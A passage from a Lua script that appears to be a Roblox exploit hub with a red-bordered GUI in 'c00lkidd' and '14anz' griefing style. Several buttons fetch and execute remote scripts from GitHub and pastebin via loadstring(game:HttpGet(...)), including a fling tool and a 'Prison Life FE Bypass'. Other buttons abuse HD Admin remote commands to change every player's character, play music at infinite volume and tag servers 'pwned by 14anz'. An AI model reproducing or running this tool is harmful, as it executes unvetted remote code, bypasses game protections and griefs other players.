					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end
	coroutine.wrap(EERUFD_fake_script)()
end)

DZRSpawnItemGui.Name = "DZR Spawn Item Gui"
DZRSpawnItemGui.Parent = AdminCommandsGuis
DZRSpawnItemGui.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
DZRSpawnItemGui.BorderColor3 = Color3.fromRGB(255, 0, 0)
DZRSpawnItemGui.BorderSizePixel = 3
DZRSpawnItemGui.Position = UDim2.new(0.5, 3, 0, 66)
DZRSpawnItemGui.Size = UDim2.new(0.5, -3, 0, 30)
DZRSpawnItemGui.ZIndex = 2
DZRSpawnItemGui.Font = Enum.Font.SourceSans
DZRSpawnItemGui.Text = "Fling Gui"
DZRSpawnItemGui.TextColor3 = Color3.fromRGB(255, 255, 255)
DZRSpawnItemGui.TextSize = 14.000
DZRSpawnItemGui.TextWrapped = true
DZRSpawnItemGui.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Orangecatgamer696969/Fling-gui/main/README.md", true)) ()
end)


KillGui.Name = "Kill Gui"
KillGui.Parent = AdminCommandsGuis
KillGui.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
KillGui.BorderColor3 = Color3.fromRGB(255, 0, 0)
KillGui.BorderSizePixel = 3
KillGui.Position = UDim2.new(0, 0, 0, 99)
KillGui.Size = UDim2.new(0.5, 0, 0, 30)
KillGui.ZIndex = 2
KillGui.Font = Enum.Font.SourceSans
KillGui.Text = "Arsenal Script"
KillGui.TextColor3 = Color3.fromRGB(255, 255, 255)
KillGui.TextSize = 14.000
KillGui.TextWrapped = true
KillGui.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/JackyPoopoo/cartel/main/0000000000000000000000000000000000000000000000000"))()
end)

SilentExecutor.Name = "Silent Executor"
SilentExecutor.Parent = AdminCommandsGuis
SilentExecutor.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
SilentExecutor.BorderColor3 = Color3.fromRGB(255, 0, 0)
SilentExecutor.BorderSizePixel = 3
SilentExecutor.Position = UDim2.new(0.5, 3, 0, 99)
SilentExecutor.Size = UDim2.new(0.5, -3, 0, 30)
SilentExecutor.ZIndex = 2
SilentExecutor.Font = Enum.Font.SourceSans
SilentExecutor.Text = "F3X Gui (skidded)"
SilentExecutor.TextColor3 = Color3.fromRGB(255, 255, 255)
SilentExecutor.TextSize = 14.000
SilentExecutor.TextWrapped = true
SilentExecutor.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/UVzPQ0jA"))()
end)

Nilizer.Name = "Nilizer"
Nilizer.Parent = AdminCommandsGuis
Nilizer.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Nilizer.BorderColor3 = Color3.fromRGB(255, 0, 0)
Nilizer.BorderSizePixel = 3
Nilizer.Position = UDim2.new(0, 0, 0, 132)
Nilizer.Size = UDim2.new(0.5, 0, 0, 30)
Nilizer.ZIndex = 2
Nilizer.Font = Enum.Font.SourceSans
Nilizer.Text = "Prison Life FE Bypass"
Nilizer.TextColor3 = Color3.fromRGB(255, 255, 255)
Nilizer.TextSize = 14.000
Nilizer.TextWrapped = true
Nilizer.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/g00lXploiter/g00lXploiter/main/Fe%20bypass", true))()
end)

RemsoAdmin.Name = "Remso Admin"
RemsoAdmin.Parent = AdminCommandsGuis
RemsoAdmin.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
RemsoAdmin.BorderColor3 = Color3.fromRGB(255, 0, 0)
RemsoAdmin.BorderSizePixel = 3
RemsoAdmin.Position = UDim2.new(0.5, 3, 0, 132)
RemsoAdmin.Size = UDim2.new(0.5, -3, 0, 30)
RemsoAdmin.ZIndex = 2
RemsoAdmin.Font = Enum.Font.SourceSans
RemsoAdmin.Text = "Blade Ball Script"
RemsoAdmin.TextColor3 = Color3.fromRGB(255, 255, 255)
RemsoAdmin.TextSize = 14.000
RemsoAdmin.TextWrapped = true
RemsoAdmin.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
end)

Rek3k.Name = "Rek3k"
Rek3k.Parent = AdminCommandsGuis
Rek3k.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Rek3k.BorderColor3 = Color3.fromRGB(255, 0, 0)
Rek3k.BorderSizePixel = 3
Rek3k.Position = UDim2.new(0, 0, 0, 165)
Rek3k.Size = UDim2.new(0.499000013, 0, 0, 30)
Rek3k.ZIndex = 2
Rek3k.Font = Enum.Font.SourceSans
Rek3k.Text = "Project Ligma (win 11)"
Rek3k.TextColor3 = Color3.fromRGB(255, 255, 255)
Rek3k.TextSize = 14.000
Rek3k.TextWrapped = true
Rek3k.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/4nSE2JCe.lua", true))()
end)

PageLabel_4.Name = "PageLabel"
PageLabel_4.Parent = Page1_2
PageLabel_4.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_4.BorderSizePixel = 3
PageLabel_4.Position = UDim2.new(0, 0, 1, -29)
PageLabel_4.Size = UDim2.new(1, 0, 0, 29)
PageLabel_4.ZIndex = 2
PageLabel_4.Font = Enum.Font.SourceSans
PageLabel_4.Text = "Page 1"
PageLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_4.TextSize = 18.000
PageLabel_4.TextWrapped = true

Page4.Name = "Page4"
Page4.Parent = Frame
Page4.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Page4.BorderColor3 = Color3.fromRGB(255, 0, 0)
Page4.BorderSizePixel = 3
Page4.Position = UDim2.new(0, 0, 0, 83)
Page4.Size = UDim2.new(1, 0, 1, -106)
Page4.Visible = false
Page4.ZIndex = 2

PresetSkyboxDecalIDs.Name = "Preset Skybox/Decal IDs"
PresetSkyboxDecalIDs.Parent = Page4
PresetSkyboxDecalIDs.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PresetSkyboxDecalIDs.BorderColor3 = Color3.fromRGB(255, 0, 0)
PresetSkyboxDecalIDs.BorderSizePixel = 3
PresetSkyboxDecalIDs.Size = UDim2.new(0.5, 0, 1, 0)
PresetSkyboxDecalIDs.ZIndex = 2

Cat.Name = "Cat"
Cat.Parent = PresetSkyboxDecalIDs
Cat.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Cat.BorderColor3 = Color3.fromRGB(255, 0, 0)
Cat.BorderSizePixel = 3
Cat.Position = UDim2.new(0, 0, 0, 33)
Cat.Size = UDim2.new(0.5, 0, 0, 30)
Cat.ZIndex = 2
Cat.Font = Enum.Font.SourceSans
Cat.Text = "14anz/c00lkidd"
Cat.TextColor3 = Color3.fromRGB(255, 255, 255)
Cat.TextSize = 14.000
Cat.TextWrapped = true

Title_15.Name = "Title"
Title_15.Parent = PresetSkyboxDecalIDs
Title_15.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_15.BorderSizePixel = 3
Title_15.Size = UDim2.new(1, 0, 0, 30)
Title_15.ZIndex = 2
Title_15.Font = Enum.Font.SourceSansBold
Title_15.Text = "Preset Skybox/Decal IDs"
Title_15.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_15.TextSize = 14.000
Title_15.TextWrapped = true

RC7.Name = "RC7"
RC7.Parent = PresetSkyboxDecalIDs
RC7.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
RC7.BorderColor3 = Color3.fromRGB(255, 0, 0)
RC7.BorderSizePixel = 3
RC7.Position = UDim2.new(0, 0, 0, 66)
RC7.Size = UDim2.new(0.5, 0, 0, 30)
RC7.ZIndex = 2
RC7.Font = Enum.Font.SourceSans
RC7.Text = "RC7"
RC7.TextColor3 = Color3.fromRGB(255, 255, 255)
RC7.TextSize = 14.000
RC7.TextWrapped = true

teamskrubl0rd.Name = "team skrubl0rd"
teamskrubl0rd.Parent = PresetSkyboxDecalIDs
teamskrubl0rd.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
teamskrubl0rd.BorderColor3 = Color3.fromRGB(255, 0, 0)
teamskrubl0rd.BorderSizePixel = 3
teamskrubl0rd.Position = UDim2.new(0.5, 3, 0, 33)
teamskrubl0rd.Size = UDim2.new(0.5, 0, 0, 30)
teamskrubl0rd.ZIndex = 2
teamskrubl0rd.Font = Enum.Font.SourceSans
teamskrubl0rd.Text = "team skrubl0rd"
teamskrubl0rd.TextColor3 = Color3.fromRGB(255, 255, 255)
teamskrubl0rd.TextSize = 12.000
teamskrubl0rd.TextWrapped = true

PresetMusicIDs.Name = "Preset Music IDs"
PresetMusicIDs.Parent = Page4
PresetMusicIDs.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PresetMusicIDs.BorderColor3 = Color3.fromRGB(255, 0, 0)
PresetMusicIDs.BorderSizePixel = 3
PresetMusicIDs.Position = UDim2.new(0.5, 3, 0, 0)
PresetMusicIDs.Size = UDim2.new(0.5, -3, 1, 0)
PresetMusicIDs.ZIndex = 2

Title_16.Name = "Title"
Title_16.Parent = PresetMusicIDs
Title_16.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_16.BorderSizePixel = 3
Title_16.Size = UDim2.new(1, 0, 0, 30)
Title_16.ZIndex = 2
Title_16.Font = Enum.Font.SourceSansBold
Title_16.Text = "Extra Music (HD ADMIN)"
Title_16.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_16.TextSize = 14.000
Title_16.TextWrapped = true

Hijacked.Name = "Hijacked"
Hijacked.Parent = PresetMusicIDs
Hijacked.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Hijacked.BorderColor3 = Color3.fromRGB(255, 0, 0)
Hijacked.BorderSizePixel = 3
Hijacked.Position = UDim2.new(0, 0, 0, 33)
Hijacked.Size = UDim2.new(0.5, 0, 0, 30)
Hijacked.ZIndex = 2
Hijacked.Font = Enum.Font.SourceSans
Hijacked.Text = "Hero DubStep"
Hijacked.TextColor3 = Color3.fromRGB(255, 255, 255)
Hijacked.TextSize = 14.000
Hijacked.MouseButton1Down:connect(function()
	local args = {
		[1] = ";music 1839526985 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

CyberChainsaw.Name = "Cyber Chainsaw"
CyberChainsaw.Parent = PresetMusicIDs
CyberChainsaw.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
CyberChainsaw.BorderColor3 = Color3.fromRGB(255, 0, 0)
CyberChainsaw.BorderSizePixel = 3
CyberChainsaw.Position = UDim2.new(0.5, 3, 0, 33)
CyberChainsaw.Size = UDim2.new(0.5, -3, 0, 30)
CyberChainsaw.ZIndex = 2
CyberChainsaw.Font = Enum.Font.SourceSans
CyberChainsaw.Text = "Logic Bomb"
CyberChainsaw.TextColor3 = Color3.fromRGB(255, 255, 255)
CyberChainsaw.TextScaled = true
CyberChainsaw.TextSize = 14.000
CyberChainsaw.TextWrapped = true
CyberChainsaw.MouseButton1Down:connect(function()
	local args = {
		[1] = ";music 104181508980428 ;volume inf ;pitch 0.2 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

AllDropping8BitBeats.Name = "All Dropping 8 Bit Beats"
AllDropping8BitBeats.Parent = PresetMusicIDs
AllDropping8BitBeats.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
AllDropping8BitBeats.BorderColor3 = Color3.fromRGB(255, 0, 0)
AllDropping8BitBeats.BorderSizePixel = 3
AllDropping8BitBeats.Position = UDim2.new(0, 0, 0, 66)
AllDropping8BitBeats.Size = UDim2.new(0.5, 0, 0, 30)
AllDropping8BitBeats.ZIndex = 2
AllDropping8BitBeats.Font = Enum.Font.SourceSans
AllDropping8BitBeats.Text = "Jumpstyle"
AllDropping8BitBeats.TextColor3 = Color3.fromRGB(255, 255, 255)
AllDropping8BitBeats.TextScaled = true
AllDropping8BitBeats.TextSize = 14.000
AllDropping8BitBeats.TextWrapped = true
AllDropping8BitBeats.MouseButton1Down:connect(function()
	local args = {
		[1] = ";music 1839246711 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

NitroFunEasterEgg.Name = "Nitro Fun - Easter Egg"
NitroFunEasterEgg.Parent = PresetMusicIDs
NitroFunEasterEgg.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
NitroFunEasterEgg.BorderColor3 = Color3.fromRGB(255, 0, 0)
NitroFunEasterEgg.BorderSizePixel = 3
NitroFunEasterEgg.Position = UDim2.new(0.5, 3, 0, 66)
NitroFunEasterEgg.Size = UDim2.new(0.5, -3, 0, 30)
NitroFunEasterEgg.ZIndex = 2
NitroFunEasterEgg.Font = Enum.Font.SourceSans
NitroFunEasterEgg.Text = "Loud Phonk"
NitroFunEasterEgg.TextColor3 = Color3.fromRGB(255, 255, 255)
NitroFunEasterEgg.TextScaled = true
NitroFunEasterEgg.TextSize = 14.000
NitroFunEasterEgg.TextWrapped = true
NitroFunEasterEgg.MouseButton1Down:connect(function()
	local args = {
		[1] = ";music 6911766512 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

PageLabel_5.Name = "PageLabel"
PageLabel_5.Parent = Page4
PageLabel_5.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_5.BorderSizePixel = 3
PageLabel_5.Position = UDim2.new(0, 0, 1, -30)
PageLabel_5.Size = UDim2.new(1, 0, 0, 30)
PageLabel_5.ZIndex = 2
PageLabel_5.Font = Enum.Font.SourceSans
PageLabel_5.Text = "Page 4"
PageLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_5.TextSize = 18.000
PageLabel_5.TextWrapped = true

Page3.Name = "Page3"
Page3.Parent = Frame
Page3.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Page3.BorderColor3 = Color3.fromRGB(255, 0, 0)
Page3.BorderSizePixel = 3
Page3.Position = UDim2.new(0, 0, 0, 83)
Page3.Size = UDim2.new(1, 0, 1, -106)
Page3.Visible = false
Page3.ZIndex = 2

LocalPlayer.Name = "LocalPlayer"
LocalPlayer.Parent = Page3
LocalPlayer.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
LocalPlayer.BorderColor3 = Color3.fromRGB(255, 0, 0)
LocalPlayer.BorderSizePixel = 3
LocalPlayer.Size = UDim2.new(0.5, 0, 1, 0)
LocalPlayer.ZIndex = 2

BillboardGui.Name = "Billboard Gui"
BillboardGui.Parent = LocalPlayer
BillboardGui.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
BillboardGui.BorderColor3 = Color3.fromRGB(255, 0, 0)
BillboardGui.BorderSizePixel = 3
BillboardGui.Position = UDim2.new(0, 0, 0, 33)
BillboardGui.Size = UDim2.new(0.5, 0, 0, 30)
BillboardGui.ZIndex = 2
BillboardGui.Font = Enum.Font.SourceSans
BillboardGui.Text = "Billboard Gui"
BillboardGui.TextColor3 = Color3.fromRGB(255, 255, 255)
BillboardGui.TextSize = 14.000
BillboardGui.MouseButton1Down:connect(function()
	local args = {
		[1] = ";titler me c00lkidd "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Title_17.Name = "Title"
Title_17.Parent = LocalPlayer
Title_17.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_17.BorderSizePixel = 3
Title_17.Size = UDim2.new(1, 0, 0, 30)
Title_17.ZIndex = 2
Title_17.Font = Enum.Font.SourceSansBold
Title_17.Text = "LocalPlayer (Need HD Admin)"
Title_17.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_17.TextSize = 14.000
Title_17.TextWrapped = true

DiscoCharacter.Name = "Disco Character"
DiscoCharacter.Parent = LocalPlayer
DiscoCharacter.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
DiscoCharacter.BorderColor3 = Color3.fromRGB(255, 0, 0)
DiscoCharacter.BorderSizePixel = 3
DiscoCharacter.Position = UDim2.new(0, 0, 0, 66)
DiscoCharacter.Size = UDim2.new(0.5, 0, 0, 30)
DiscoCharacter.ZIndex = 2
DiscoCharacter.Font = Enum.Font.SourceSans
DiscoCharacter.Text = "Ghost"
DiscoCharacter.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscoCharacter.TextSize = 14.000
DiscoCharacter.TextWrapped = true
DiscoCharacter.MouseButton1Down:connect(function()
	local args = {
		[1] = ";ghost Me "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

ChickenArms.Name = "Chicken Arms"
ChickenArms.Parent = LocalPlayer
ChickenArms.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
ChickenArms.BorderColor3 = Color3.fromRGB(255, 0, 0)
ChickenArms.BorderSizePixel = 3
ChickenArms.Position = UDim2.new(0.5, 3, 0, 66)
ChickenArms.Size = UDim2.new(0.5, -3, 0, 30)
ChickenArms.ZIndex = 2
ChickenArms.Font = Enum.Font.SourceSans
ChickenArms.Text = "Neon"
ChickenArms.TextColor3 = Color3.fromRGB(255, 255, 255)
ChickenArms.TextSize = 14.000
ChickenArms.MouseButton1Down:connect(function()
	local args = {
		[1] = ";neon Me "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

DominusGhost.Name = "Dominus Ghost"
DominusGhost.Parent = LocalPlayer
DominusGhost.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
DominusGhost.BorderColor3 = Color3.fromRGB(255, 0, 0)
DominusGhost.BorderSizePixel = 3
DominusGhost.Position = UDim2.new(0, 0, 0, 99)
DominusGhost.Size = UDim2.new(0.5, 0, 0, 30)
DominusGhost.ZIndex = 2
DominusGhost.Font = Enum.Font.SourceSans
DominusGhost.Text = "Become 14anz"
DominusGhost.TextColor3 = Color3.fromRGB(255, 255, 255)
DominusGhost.TextSize = 14.000
DominusGhost.TextWrapped = true
DominusGhost.MouseButton1Down:connect(function()
	local args = {
		[1] = ";char Me 14anz_exiled "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

JD.Name = "JD"
JD.Parent = LocalPlayer
JD.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
JD.BorderColor3 = Color3.fromRGB(255, 0, 0)
JD.BorderSizePixel = 3
JD.Position = UDim2.new(0.5, 3, 0, 99)
JD.Size = UDim2.new(0.5, -3, 0, 30)
JD.ZIndex = 2
JD.Font = Enum.Font.SourceSans
JD.Text = "John Doe"
JD.TextColor3 = Color3.fromRGB(255, 255, 255)
JD.TextSize = 14.000
JD.TextWrapped = true
JD.MouseButton1Down:connect(function()
	local args = {
		[1] = ";char Me JohnDoe "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

FloatingPad.Name = "Floating Pad"
FloatingPad.Parent = LocalPlayer
FloatingPad.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
FloatingPad.BorderColor3 = Color3.fromRGB(255, 0, 0)
FloatingPad.BorderSizePixel = 3
FloatingPad.Position = UDim2.new(0, 0, 0, 132)
FloatingPad.Size = UDim2.new(0.5, 0, 0, 30)
FloatingPad.ZIndex = 2
FloatingPad.Font = Enum.Font.SourceSans
FloatingPad.Text = "Floating Pad (Not Working Cause I Forgot Abt It)"
FloatingPad.TextColor3 = Color3.fromRGB(255, 255, 255)
FloatingPad.TextSize = 14.000
FloatingPad.TextWrapped = true
FloatingPad.MouseButton1Down:connect(function()

end)

SetWalkspeed.Name = "Set Walkspeed"
SetWalkspeed.Parent = LocalPlayer
SetWalkspeed.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
SetWalkspeed.BorderColor3 = Color3.fromRGB(255, 0, 0)
SetWalkspeed.BorderSizePixel = 3
SetWalkspeed.Position = UDim2.new(0.5, 3, -0.0919220075, 165)
SetWalkspeed.Size = UDim2.new(0.5, -3, 0, 30)
SetWalkspeed.ZIndex = 2
SetWalkspeed.Font = Enum.Font.SourceSans
SetWalkspeed.Text = "Set Walkspeed"
SetWalkspeed.TextColor3 = Color3.fromRGB(255, 255, 255)
SetWalkspeed.TextSize = 14.000
SetWalkspeed.TextWrapped = true
SetWalkspeed.MouseButton1Down:connect(function()
	local args = {
		[1] = ";speed Me 50 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Heal.Name = "Heal"
Heal.Parent = LocalPlayer
Heal.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Heal.BorderColor3 = Color3.fromRGB(255, 0, 0)
Heal.BorderSizePixel = 3
Heal.Position = UDim2.new(0, 0, 0, 164)
Heal.Size = UDim2.new(0.5, 0, 0, 30)
Heal.ZIndex = 2
Heal.Font = Enum.Font.SourceSans
Heal.Text = "Heal"
Heal.TextColor3 = Color3.fromRGB(255, 255, 255)
Heal.TextSize = 14.000
Heal.TextWrapped = true
Heal.MouseButton1Down:connect(function()
	local args = {
		[1] = ";heal Me "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

ChangeName.Name = "Change Name"
ChangeName.Parent = LocalPlayer
ChangeName.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
ChangeName.BorderColor3 = Color3.fromRGB(255, 0, 0)
ChangeName.BorderSizePixel = 3
ChangeName.Position = UDim2.new(0.5, 3, 0, 33)
ChangeName.Size = UDim2.new(0.5, -3, 0, 30)
ChangeName.ZIndex = 2
ChangeName.Font = Enum.Font.SourceSans
ChangeName.Text = "Change Name"
ChangeName.TextColor3 = Color3.fromRGB(255, 255, 255)
ChangeName.TextSize = 14.000
ChangeName.MouseButton1Down:connect(function()
	local args = {
		[1] = ";Name Me c00lkidd "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

Misc.Name = "Misc."
Misc.Parent = Page3
Misc.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Misc.BorderColor3 = Color3.fromRGB(255, 0, 0)
Misc.BorderSizePixel = 3
Misc.Position = UDim2.new(0.5, 3, 0, 0)
Misc.Size = UDim2.new(0.5, -3, 1, 0)
Misc.ZIndex = 2

Title_18.Name = "Title"
Title_18.Parent = Misc
Title_18.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_18.BorderSizePixel = 3
Title_18.Size = UDim2.new(1, 0, 0, 30)
Title_18.ZIndex = 2
Title_18.Font = Enum.Font.SourceSansBold
Title_18.Text = "Misc. (Need HD ADMIN)"
Title_18.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_18.TextSize = 14.000
Title_18.TextWrapped = true

PlayMusic.Name = "Play Music"
PlayMusic.Parent = Misc
PlayMusic.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PlayMusic.BorderColor3 = Color3.fromRGB(255, 0, 0)
PlayMusic.BorderSizePixel = 3
PlayMusic.Position = UDim2.new(0, 0, 0, 33)
PlayMusic.Size = UDim2.new(0.5, 0, 0, 30)
PlayMusic.ZIndex = 2
PlayMusic.Font = Enum.Font.SourceSans
PlayMusic.Text = "Play Music"
PlayMusic.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayMusic.TextSize = 14.000
PlayMusic.TextWrapped = true
PlayMusic.MouseButton1Down:connect(function()
	local args = {
		[1] = ";music 138081566 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

DiscoFog.Name = "Disco Fog"
DiscoFog.Parent = Misc
DiscoFog.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
DiscoFog.BorderColor3 = Color3.fromRGB(255, 0, 0)
DiscoFog.BorderSizePixel = 3
DiscoFog.Position = UDim2.new(0.5, 3, 0, 33)
DiscoFog.Size = UDim2.new(0.5, -3, 0, 30)
DiscoFog.ZIndex = 2
DiscoFog.Font = Enum.Font.SourceSans
DiscoFog.Text = "Disco Fog"
DiscoFog.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscoFog.TextSize = 14.000
DiscoFog.MouseButton1Down:connect(function()
	local args = {
		[1] = ";fogend 200 ;disco "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

BecomeOwnerinPersonalServer.Name = "Become Owner in Personal Server"
BecomeOwnerinPersonalServer.Parent = Misc
BecomeOwnerinPersonalServer.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
BecomeOwnerinPersonalServer.BorderColor3 = Color3.fromRGB(255, 0, 0)
BecomeOwnerinPersonalServer.BorderSizePixel = 3
BecomeOwnerinPersonalServer.Position = UDim2.new(0.5, 3, 0, 66)
BecomeOwnerinPersonalServer.Size = UDim2.new(0.5, -3, 0, 30)
BecomeOwnerinPersonalServer.ZIndex = 2
BecomeOwnerinPersonalServer.Font = Enum.Font.SourceSans
BecomeOwnerinPersonalServer.Text = "Char All 14anz"
BecomeOwnerinPersonalServer.TextColor3 = Color3.fromRGB(255, 255, 255)
BecomeOwnerinPersonalServer.TextSize = 14.000
BecomeOwnerinPersonalServer.TextWrapped = true
BecomeOwnerinPersonalServer.MouseButton1Down:connect(function()
	local args = {
		[1] = ";char all 14anz_exiled "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

LeaderstatChange.Name = "Leaderstat Change"
LeaderstatChange.Parent = Misc
LeaderstatChange.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
LeaderstatChange.BorderColor3 = Color3.fromRGB(255, 0, 0)
LeaderstatChange.BorderSizePixel = 3
LeaderstatChange.Position = UDim2.new(-0.00340136047, 3, -0.183844015, 132)
LeaderstatChange.Size = UDim2.new(0.5, -3, 0, 30)
LeaderstatChange.ZIndex = 2
LeaderstatChange.Font = Enum.Font.SourceSans
LeaderstatChange.Text = "Add Teams"
LeaderstatChange.TextColor3 = Color3.fromRGB(255, 255, 255)
LeaderstatChange.TextSize = 14.000
LeaderstatChange.TextWrapped = true
LeaderstatChange.MouseButton1Down:connect(function()
	local args = {
		[1] = ";createteam red pwned by 14anz ;createteam Blue pwned by 14anz "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

PageLabel_6.Name = "PageLabel"
PageLabel_6.Parent = Page3
PageLabel_6.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_6.BorderSizePixel = 3
PageLabel_6.Position = UDim2.new(0, 0, 1, -30)
PageLabel_6.Size = UDim2.new(1, 0, 0, 30)
PageLabel_6.ZIndex = 2
PageLabel_6.Font = Enum.Font.SourceSans
PageLabel_6.Text = "Page 3"
PageLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_6.TextSize = 18.000
PageLabel_6.TextWrapped = true

Page5.Name = "Page5"
Page5.Parent = Frame
Page5.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Page5.BorderColor3 = Color3.fromRGB(255, 0, 0)
Page5.BorderSizePixel = 3
Page5.Position = UDim2.new(0, 0, 0, 83)
Page5.Size = UDim2.new(1, 0, 1, -106)
Page5.Visible = false
Page5.ZIndex = 2

PageLabel_7.Name = "PageLabel"
PageLabel_7.Parent = Page5
PageLabel_7.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_7.BorderSizePixel = 3
PageLabel_7.Position = UDim2.new(0, 0, 1, -30)
PageLabel_7.Size = UDim2.new(1, 0, 0, 30)
PageLabel_7.ZIndex = 2
PageLabel_7.Font = Enum.Font.SourceSans
PageLabel_7.Text = "Page 5"
PageLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_7.TextSize = 18.000
PageLabel_7.TextWrapped = true

PageLabel_8.Name = "PageLabel"
PageLabel_8.Parent = Page5
PageLabel_8.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_8.BorderSizePixel = 0
PageLabel_8.Position = UDim2.new(0, 0, 0.0919220075, -30)
PageLabel_8.Size = UDim2.new(1, 0, -0.00835654046, 30)
PageLabel_8.ZIndex = 2
PageLabel_8.Font = Enum.Font.SourceSansBold
PageLabel_8.Text = "Credits"
PageLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_8.TextSize = 18.000
PageLabel_8.TextWrapped = true

PageLabel_9.Name = "PageLabel"
PageLabel_9.Parent = Page5
PageLabel_9.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_9.BorderSizePixel = 0
PageLabel_9.Position = UDim2.new(0, 0, 0.175487459, -30)
PageLabel_9.Size = UDim2.new(1, 0, -0.00835654046, 30)
PageLabel_9.ZIndex = 2
